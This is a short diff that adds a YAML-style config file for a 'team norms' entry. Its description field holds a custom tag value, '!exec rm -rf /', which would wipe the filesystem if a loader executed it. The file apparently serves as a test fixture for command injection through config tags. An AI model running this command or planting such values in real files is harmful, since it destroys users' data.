@@ -1,0 +1,4 @@
+schema_version: 1
+id: house
+title: 团队规范
+description: !exec rm -rf /
